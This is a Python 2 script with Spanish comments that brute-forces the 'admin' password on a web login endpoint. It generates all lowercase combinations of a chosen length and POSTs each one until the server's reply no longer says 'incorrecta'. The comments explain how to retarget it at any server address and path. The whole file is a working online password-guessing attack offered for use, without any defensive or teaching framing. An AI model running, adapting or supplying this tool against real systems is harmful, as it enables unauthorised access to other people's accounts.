#!/usr/bin/env python
#-*- coding: utf-8 -*-
#http://127.0.0.1:8080/login.html
#user pass
#para usar el programa cambiar los valores de las siguientes variables
#ipservidor con la direccion ip o la dns del servidor y su perto ejemplo: '192.168.0.101:8080'
#ruta con la ruta  del servidor donde se envia la peticion post ejemplo '/login.php'
#longitud con la longitud que creemos que tiene la contraseña ejemplo: si la pass es 'hola' tiene 4 asi que colocamos longitud = 4
#modificar la variable cabeceras dependiendo de el tipo de cabecera que lleve la peticion puede ser cabeceraparaurlencode o cabecerajson
import httplib, urllib
import itertools
import json



minusculas = 'abcdefghijklmnopqrstuvwxyz'
Mayusculas = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
Numeros = 123456789
cabeceraparaurlencode = {'content-type': 'application/x-form-urlencoded','Accept': 'text/plain'}
cabecerajson = {'Content-Type': 'application/json'}
ipServidor = '127.0.0.1:4000'
ruta = '/agregar_contenido'
# Especiales !"#$%&/()=?¡*_:,;.-'¿

longitud = 4
#aca pasamos como parametro a la funcion list la variable minusculas o mayusculas o numeros o mayusculas + minusculas por ejemplo con este parametro python generara contraseñas con las diferentes convinaciones

arreglo = list(minusculas)
combinaciones = itertools.product(arreglo , repeat=longitud)
#print list(combinaciones)

for i in combinaciones:
    abrir_conexion = httplib.HTTPConnection(ipServidor)
    cabeceras = cabecerajson
    password = ''.join(i)
    #print(password)
    #coneccion
    #parametros = urllib.urlencode({'user': 'admin' , 'pass': password})
    #print(parametros)
    objjson = json.dumps({'user': 'admin' , 'pass': password})
    #print(objjson)
    print('probando contraseña: ' + password)
    abrir_conexion.request('POST', ruta, objjson, cabeceras)
    respuesta = abrir_conexion.getresponse()
    respuesta_desde_servidor = respuesta.read()
    #print(respuesta_desde_servidor)

    if 'incorrecta' in respuesta_desde_servidor:
        print('contraseña incorrecta')
    else:
        print('---------------------CONTRASEÑA ENCONTRADA-----------------------')
        print('La contraseña es: ' + password)
        break

abrir_conexion.close()
